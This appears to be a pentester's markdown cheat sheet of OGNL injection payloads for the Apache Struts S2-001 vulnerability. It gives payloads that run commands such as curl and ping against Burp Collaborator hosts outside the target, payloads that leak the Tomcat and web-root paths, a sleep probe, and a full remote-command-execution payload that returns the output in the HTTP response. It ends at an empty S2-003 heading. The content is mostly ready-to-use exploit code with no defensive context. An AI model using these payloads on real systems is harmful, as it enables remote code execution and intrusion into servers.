# struts-vuln

## s2-001:
##### Minimal payload:
```
%{@java.lang.Runtime@getRuntime().exec('curl 132poma4l3k2ugiooej4aptsqjwck1.burpcollaborator.net')}
```
- url encoded:
``` 
username=%25{@java.lang.Runtime@getRuntime().exec('curl 132poma4l3k2ugiooej4aptsqjwck1.burpcollaborator.net')}
```

- Output: `java.lang.UNIXProcess@58f17c3c`


##### Alternative payloads:
 - Using `java.lang.ProcessBuilder`: to execute command
```
%{(new java.lang.ProcessBuilder(new java.lang.String []{"ping","yz1h62j86v3zxqvq1xl5g967iyoocd.burpcollaborator.net"})).start()}
```

- Sleep payload ?:
```
%{@java.lang.Thread@sleep(10000)}
```
- Get the tomcat path:
```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```
- Get the web site real path:
```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```
- RCE with output in response:
```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

```


## s2-003:
